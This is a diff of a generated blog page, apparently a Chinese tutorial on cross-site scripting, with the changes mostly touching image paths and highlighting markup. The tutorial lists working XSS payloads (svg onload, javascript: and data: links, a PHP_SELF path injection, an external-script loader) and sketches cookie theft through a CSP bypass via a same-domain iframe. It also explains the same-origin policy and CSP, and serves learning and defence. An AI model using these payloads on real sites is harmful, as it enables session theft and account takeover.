@@ -99,14 +99,14 @@
       
         <p>[TOC]</p>
 <h2 id="XSS-跨站脚本攻击漏洞-个人整理"><a href="#XSS-跨站脚本攻击漏洞-个人整理" class="headerlink" title="XSS 跨站脚本攻击漏洞 个人整理"></a>XSS 跨站脚本攻击漏洞 个人整理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整体篇幅比较长，也算是我自己学习道路上的总结。</span><br><span class="line">大家捡有用的看吧，尽可能屎里捞金，还望多多支持我心血来潮的产物~</span><br></pre></td></tr></table></figure>
-<h3 id="一-攻击原理："><a href="#一-攻击原理：" class="headerlink" title="一.攻击原理："></a>一.攻击原理：</h3><p><img src="xss1.png" alt=""></p>
+<h3 id="一-攻击原理："><a href="#一-攻击原理：" class="headerlink" title="一.攻击原理："></a>一.攻击原理：</h3><p><img src="/2018/01/25/Explain-XSS/xss1.png" alt=""></p>
 <p>设计网页时没有对用户输入内容进行有效的过滤，导致用户恶意输入的符号对现有html代码造成闭合，从而加载外部js代码对浏览者进行恶意攻击（获取cookie伪造登录，浏览器截屏，url跳转等等）</p>
 <p>比如网页有一功能：某标签内的value引用一个用户输入的值，然而用户使用 “ 闭合value后面的赋值，接着后面输入onload=”alert(1) 又与value原本的第二个” 相结合，构造出一段额外的弹窗代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;xxx&quot; value=&quot; from_user_input &quot;/&gt;</span><br></pre></td></tr></table></figure>
-<p>当 用户输入” onfocus=”alert(1) 时变成了这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;xxx&quot; value=&quot;&quot; onfocus=&quot;alert(1) &quot;/&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">" from_user_input "</span>/&gt;</span><br></pre></td></tr></table></figure>
+<p>当 用户输入” onfocus=”alert(1) 时变成了这样：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"xxx"</span> <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">onfocus</span>=<span class="string">"alert(1) "</span>/&gt;</span><br></pre></td></tr></table></figure></p>
 <p>value后面的值被双引号闭合，后面又构造出了一个on事件，从而执行攻击者自定义的操作</p>
 <p>总的来说XSS基本流程是： 攻击者输入-&gt;网页输出-&gt; 受害者打开网页浏览中招</p>
-<p><img src="xss.png" alt=""></p>
+<p><img src="/2018/01/25/Explain-XSS/xss.png" alt=""></p>
 <h3 id="二-XSS类型分类："><a href="#二-XSS类型分类：" class="headerlink" title="二.XSS类型分类："></a>二.XSS类型分类：</h3><p>XSS可以大致分为两或三类:</p>
 <h4 id="第一类："><a href="#第一类：" class="headerlink" title="第一类："></a>第一类：</h4><p>如果攻击payload存于url中，受害者需要访问特定携带payload的url才会中招，并且payload并不会入库即不会存储持续触发，则可以称此类型的XSS漏洞为反射型XSS<br>比如网页通过调用当前页面get传入的参数显示到页面中。<br>这类XSS最好防范，危险系数也相对较低，但存在数量较多，挖掘成本低</p>
 <p>大致流程：访问页面进行构造闭合测试，查看源码或者F12使用开发者工具进行修改调试，能弹窗后进行cookie获取测试</p>
@@ -114,25 +114,25 @@
 <h4 id="第二类："><a href="#第二类：" class="headerlink" title="第二类："></a>第二类：</h4><p>如果攻击payload可以入库，并且长期反应在某一页面中，受害者只要浏览了特定页面就会中招，则称此类型为储存型XSS。<br>这类XSS危害大，挖掘成本较高(需要目标站的提交数据权限)<br>大致流程:<br>通过修改个人资料或提交留言行为进行测试，一般提交一串xss sheet 或者自己觉得好用的payload，当弹框成功后再考虑构造进一步攻击。</p>
 <p>根据构造闭合代码性质不同(html标签or页面JS代码)，还可分为普通XSS和Dom型XSS。</p>
 <p>笔者曾经挖到过CNZZ个人管理页面的DOM储存型XSS，但是属于self-xss，即只有自己能中招的XSS（其他用户访问不到这个页面），如果不能结合CSRF漏洞则比较鸡肋,属于SRC混分行为。</p>
-<h3 id="三-一些经典测试payload："><a href="#三-一些经典测试payload：" class="headerlink" title="三.一些经典测试payload："></a>三.一些经典测试payload：</h3><h5 id="笔者最喜欢用的payload是："><a href="#笔者最喜欢用的payload是：" class="headerlink" title="笔者最喜欢用的payload是："></a>笔者最喜欢用的payload是：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=alert(1)//</span><br></pre></td></tr></table></figure>
+<h3 id="三-一些经典测试payload："><a href="#三-一些经典测试payload：" class="headerlink" title="三.一些经典测试payload："></a>三.一些经典测试payload：</h3><h5 id="笔者最喜欢用的payload是："><a href="#笔者最喜欢用的payload是：" class="headerlink" title="笔者最喜欢用的payload是："></a>笔者最喜欢用的payload是：</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg/onload=alert(1)//</span></span><br></pre></td></tr></table></figure>
 <p>当时拿着这段payload这插插那插插，一天就过去了，玩的不亦乐乎<br>现在想想，这段短小的payload伴随了我测试XSS漏洞的整个时光呢~</p>
-<h5 id="具体引用外部js的代码姿势是"><a href="#具体引用外部js的代码姿势是" class="headerlink" title="具体引用外部js的代码姿势是:"></a>具体引用外部js的代码姿势是:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;js地址&apos;//</span><br></pre></td></tr></table></figure>
+<h5 id="具体引用外部js的代码姿势是"><a href="#具体引用外部js的代码姿势是" class="headerlink" title="具体引用外部js的代码姿势是:"></a>具体引用外部js的代码姿势是:</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 <p>在火狐浏览器下查看的效果(浏览器解析时会自动加上引号):</p>
-<p><img src="svg.png" alt=""></p>
-<h5 id="a标签伪协议执行"><a href="#a标签伪协议执行" class="headerlink" title="a标签伪协议执行"></a>a标签伪协议执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot; &gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="data引用外域资源"><a href="#data引用外域资源" class="headerlink" title="data引用外域资源"></a>data引用外域资源</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;base64,这里跟着base64之后的js代码&quot;&gt;click here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/01/25/Explain-XSS/svg.png" alt=""></p>
+<h5 id="a标签伪协议执行"><a href="#a标签伪协议执行" class="headerlink" title="a标签伪协议执行"></a>a标签伪协议执行</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span> &gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="data引用外域资源"><a href="#data引用外域资源" class="headerlink" title="data引用外域资源"></a>data引用外域资源</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,这里跟着base64之后的js代码"</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>外域获取cookie,据我所知只有火狐才可以了，这里涉及同源策略相关知识。</p>
 <p>具体情况还需要具体分析，一定要记住 灵活构造 才是XSS最核心的东西</p>
 <p>以上是黑盒测试我自己的基本流程</p>
 <p>如果平时代码审计呢？</p>
 <p>在PHP下我还真审计出来不少,基本操作还是那些，说一个记忆比较深刻的吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;PHP_SELF&apos;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">_SERVER[<span class="string">'PHP_SELF'</span>]</span></span><br></pre></td></tr></table></figure>
 <p>这个PHP超全局变量如果作为输出显示到网页中，会提供当前url，<br>然而不少php环境下开启PATH_INFO，这种功能可以提供路径的形式传参<br>比如Wordpress提供生成静态链接方法，路径是index/article/001，其实这是给index.php传入 article 和 001两个参数，我们可以构造</p>
 <p><code>http://url.cn/index/&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;/xxx/</code></p>
 <p>来作为传入参数，这样显示的url也就包括了这一段payload<br>有趣的是，我在写上面代码的时候，我的markdown编辑器预览界面弹窗了233</p>
 <h3 id="四-谈谈防护："><a href="#四-谈谈防护：" class="headerlink" title="四.谈谈防护："></a>四.谈谈防护：</h3><h5 id="SOP策略（同源策略）"><a href="#SOP策略（同源策略）" class="headerlink" title="SOP策略（同源策略）"></a>SOP策略（同源策略）</h5><p>源是主机，协议，端口名的一个三元组。</p>
 <p>同源策略(Same Origin Policy, SOP)是Web应用程序的一种安全模型，它控制了网页中DOM之间的访问。注意：它仅仅是个模型</p>
-<p>给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EX: http://a.url.cn/c0d3r1iu.html</span><br></pre></td></tr></table></figure></p>
+<p>给定一个页面，如果另一个页面使用的协议、端口、主机名都相同，我们则认为两个页面具有相同的源。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">EX:</span> <span class="string">http:</span><span class="comment">//a.url.cn/c0d3r1iu.html</span></span><br></pre></td></tr></table></figure></p>
 <hr>
 <p><a href="http://a.url.cn:80/marvel/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/marvel/c0d3r1iu.html</a> 同源<br><a href="http://a.url.cn:80/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:80/c0d3r1iu.html</a> 同源<br><a href="http://b.a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">http://b.a.url.cn/c0d3r1iu.html</a> 同源 (二级域相同的三级域名)<br><a href="https://a.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://a.url.cn/c0d3r1iu.html</a> 不同源<br><a href="http://a.url.cn:88/c0d3r1iu.html" target="_blank" rel="noopener">http://a.url.cn:88/c0d3r1iu.html</a> 不同源<br><a href="https://b.url.cn/c0d3r1iu.html" target="_blank" rel="noopener">https://b.url.cn/c0d3r1iu.html</a> 不同源</p>
 <hr>
@@ -165,15 +165,15 @@
 <p>PS:如果要采用多种关键字，直接空格连接就OK</p>
 <hr>
 <p>做些小实验方便理解一些东西：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;&quot;&gt;</span><br><span class="line">&lt;script  nonce=&quot;ab&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script  nonce=&quot;abc&quot;&gt;alert(2)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'none';script-src 'nonce-abc'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"ab"</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">alert(2)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>如果不加第一行，那么会弹窗1，2<br>但是加了CSP策略，只会弹出2，因为alert(1)所在的script标签nonce不符合策略要求</p>
 <p>接下来通过一个XSS挑战例子说明：</p>
 <p>我们设置如下内容安全策略来限制script加载的地址和iframe加载的地址：</p>
-<p><img src="csp.png" alt=""></p>
+<p><img src="/2018/01/25/Explain-XSS/csp.png" alt=""></p>
 <p>当我们试图在iframe将地址设置成 www.baidu.com 的时候，可以看到不会加载成功</p>
-<p><img src="csp3.png" alt=""></p>
+<p><img src="/2018/01/25/Explain-XSS/csp3.png" alt=""></p>
 <p>如果我们换成符合设定CSP规则的，则可以加载成功</p>
-<p><img src="csp2.png" alt=""></p>
+<p><img src="/2018/01/25/Explain-XSS/csp2.png" alt=""></p>
 <p>此乃内容安全策略，它限制了在当前网页Dom加载资源的来源</p>
 <p>于是我们可以加载主域名相同的其他有XSS漏洞的站点来攻击这个站点</p>
 <p>在嵌入的子页面执行攻击代码，通过top方法，获取父页面的document.cookie</p>
@@ -191,7 +191,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://c0der1iu.github.io/2018/01/25/Explain-XSS/" data-id="cjcvghbn400005qjxw0d1m3wk" class="article-share-link">Share</a>
+      <a data-url="http://c0der1iu.github.io/2018/01/25/Explain-XSS/" data-id="cjcvgw48y0000djjxuci7smt9" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS-跨站脚本攻击/">XSS 跨站脚本攻击</a></li></ul>
@@ -203,9 +203,9 @@
 <nav id="article-nav">
   
   
-    <a href="/2018/01/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2018/01/25/XSS-Explain/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
+      <div class="article-nav-title">Explain-XSS</div>
     </a>
   
 </nav>
@@ -257,6 +257,10 @@
         
           <li>
             <a href="/2018/01/25/Explain-XSS/">Explain-XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/25/XSS-Explain/">Explain-XSS</a>
           </li>
         
           <li>
